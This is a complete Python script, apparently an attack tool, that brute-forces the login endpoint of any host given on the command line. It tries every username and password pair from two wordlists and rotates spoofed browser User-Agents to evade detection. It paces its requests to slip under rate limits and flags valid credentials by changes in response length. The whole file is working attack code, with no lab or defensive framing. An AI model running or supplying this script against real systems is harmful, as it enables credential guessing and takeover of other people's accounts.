import requests
import random
import argparse
from time import sleep

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Brute-force login endpoint.")
parser.add_argument("target", help="Target in the format <hostname>:<port> or <hostname> (default port: 3100)")
parser.add_argument("--endpoint", default="/login/login", help="Login endpoint path (default: /login/login)")
args = parser.parse_args()

# Extract hostname and port from the target argument
if ":" in args.target:
    hostname, port = args.target.split(":")
    port = int(port)  # Convert port to integer
else:
    hostname = args.target
    port = 3100  # Default port

# Target URL (use HTTPS if port is 443)
if port == 443:
    url = f"https://{hostname}{args.endpoint}"
else:
    url = f"http://{hostname}:{port}{args.endpoint}"

# Headers
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# List of User-Agents for rotation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# Load usernames and passwords
with open("users.txt") as users_file, open("passwords.txt") as passwords_file:
    users = users_file.read().splitlines()
    passwords = passwords_file.read().splitlines()

# Counter for progress tracking
total_attempts = len(users) * len(passwords)
current_attempt = 0

# Store the baseline response length for invalid credentials
baseline_response_length = None

# Brute-force loop
for user in users:
    for password in passwords:
        current_attempt += 1
        print(f"Attempt {current_attempt}/{total_attempts}: Testing {user} / {password}")

        # Skip empty passwords
        if not password:
            print("[-] Skipping empty password")
            continue

        # Randomize User-Agent
        headers["User-Agent"] = random.choice(user_agents)

        # Payload
        payload = {"email": user, "password": password}

        try:
            # Send POST request
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            
            # Set baseline response length if not already set
            if baseline_response_length is None:
                baseline_response_length = len(response.text)
                print(f"[*] Baseline response length set to: {baseline_response_length}")

            # Check for successful login
            if response.status_code == 200 and len(response.text) != baseline_response_length:
                print("\n[+] Potential valid credentials found!")
                print(f"Email: {user}")
                print(f"Password: {password}")
                print("Response:", response.text)
            else:
                print("[-] Invalid credentials or no change in response")

        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {e}")
            print("Retrying in 5 seconds...")
            sleep(5)
            continue

        # Delay to avoid rate limiting
        sleep(1)

print("\nBrute-force attack completed.")
